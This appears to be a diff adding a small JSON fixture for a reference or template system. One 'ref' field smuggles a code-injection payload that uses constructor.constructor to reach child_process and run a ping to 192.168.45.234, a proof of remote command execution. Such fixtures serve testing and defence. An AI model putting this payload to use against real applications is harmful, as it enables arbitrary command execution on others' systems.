@@ -1,0 +1,19 @@
+{
+  "ref": {
+    "id": "55cf687663",
+    "name": "Active Item"
+  },
+  "value": null,
+  "parts": [
+    {
+      "type": "text",
+      "value": "item"
+    },
+    {
+      "type": "ref",
+      "index": "1",
+      "value": "id;ref.constructor.constructor('return child_process')().exec('ping -c 4 192.168.45.234')"
+    }
+  ],
+  "i": 1
+}
